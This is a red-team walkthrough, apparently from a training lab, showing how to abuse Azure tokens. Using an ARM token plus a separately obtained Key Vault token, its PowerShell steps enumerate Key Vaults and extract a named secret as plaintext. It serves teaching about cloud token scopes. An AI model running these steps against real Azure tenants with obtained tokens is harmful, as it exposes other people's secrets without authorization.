# 🔴 Red Team Walkthrough: Azure Key Vault Token Abuse

## 📌 Overview
This walkthrough demonstrates how a red team operator can:
- Authenticate to Azure using an ARM access token  
- Enumerate Key Vault resources  
- Acquire a Key Vault access token  
- Re-authenticate with expanded access  
- Extract secret values from Azure Key Vault  

---

## 🧩 Step 1: Authenticate to Azure (ARM Token)

```powershell
Connect-AzAccount -AccessToken $ARM `
  -AccountId luke.skywalker@rcce.mscyberlab.com `
  -Tenant 146ea19f-5e54-4e83-b037-e06518439cef
```

---

## ✅ Step 2: Verify Authentication

```powershell
Get-AzContext
```

---

## 🔍 Step 3: Enumerate Key Vaults

```powershell
Get-AzKeyVault
```

---

## 🔐 Step 4: Attempt Secret Enumeration (Pre-Token)

```powershell
Get-AzKeyVaultSecret -VaultName "kvbluecorpctrcce"
```

---

## 🎟️ Step 5: Obtain Key Vault Access Token

- Execute your token generation script
- Load token into:
  - GraphSpy
  - $KeyVaultAccessToken variable

> Token must be scoped for https://vault.azure.net

---

## 🔑 Step 6: Re-Authenticate with Key Vault Token

```powershell
Connect-AzAccount `
  -AccessToken $ARM `
  -KeyVaultAccessToken $KeyVaultAccessToken `
  -AccountId luke.skywalker@rcce.mscyberlab.com
```

---

## 🔄 Step 7: Re-Enumerate Secrets

```powershell
Get-AzKeyVaultSecret -VaultName "kvbluecorpctrcce"
```

---

## 💎 Step 8: Extract Secret Value

```powershell
$(Get-AzKeyVaultSecret `
  -VaultName "kvbluecorpctrcce" `
  -Name "SuperSaiyan").SecretValue | ConvertFrom-SecureString -AsPlainText
```

---

## ⚠️ Red Team Notes

- ARM tokens do NOT grant data plane access  
- Key Vault requires separate token for vault.azure.net  
- Demonstrates token scope separation abuse  

---

## 🧠 Key Takeaways

- Control plane ≠ Data plane  
- Multiple resource tokens required  
- Token misuse can lead to secret exposure  
